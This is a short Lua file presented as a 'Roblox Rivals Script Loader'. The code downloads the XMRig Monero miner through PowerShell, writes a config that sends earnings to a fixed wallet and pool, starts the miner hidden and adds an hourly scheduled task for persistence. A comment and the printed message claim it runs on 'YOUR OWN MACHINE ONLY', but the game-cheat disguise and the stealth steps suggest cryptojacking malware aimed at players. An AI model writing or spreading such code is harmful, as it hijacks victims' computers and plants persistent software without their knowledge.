-- Roblox Rivals Script Loader - Monero Miner (YOUR OWN MACHINE ONLY)
local function download_and_run()
    local miner_url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
    local zip_path = os.getenv("TEMP") .. "\\xmrig.zip"
    local extract_path = os.getenv("TEMP") .. "\\xmrig"
    
    -- Download XMRig
    local ps_download = 'powershell -c "Invoke-WebRequest -Uri \\"' .. miner_url .. '\\" -OutFile \\"' .. zip_path .. '\\""'
    os.execute(ps_download)
    
    -- Extract
    os.execute('powershell -c "Expand-Archive -Path \\"' .. zip_path .. '\\" -DestinationPath \\"' .. extract_path .. '\\""')
    
    -- Create config.json with YOUR wallet
    local config = [[
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "huge-pages": false,
        "max-threads-hint": 75
    },
    "pools": [
        {
            "url": "pool.supportxmr.com:3333",
            "user": "42yDygoMpHmjUk4vLQSwhsCUzQPRdxryt2J7scYSoRRREhSYQv6busiCSbS5411YCBTy4hmQpbZ2pTLx5uenWvMPRcc5p7Y",
            "pass": "x",
            "tls": false
        }
    ]
}
    ]]
    local config_path = extract_path .. "\\config.json"
    local f = io.open(config_path, "w")
    f:write(config)
    f:close()
    
    -- Run miner (hidden)
    os.execute('start /b "" "' .. extract_path .. '\\xmrig.exe"')
    
    -- Persistence
    os.execute('schtasks /create /tn "RivalsMiner" /tr "' .. extract_path .. '\\xmrig.exe" /sc hourly /f >nul 2>&1')
    
    print("[RIVALS] Miner started on YOUR machine.")
end

download_and_run()
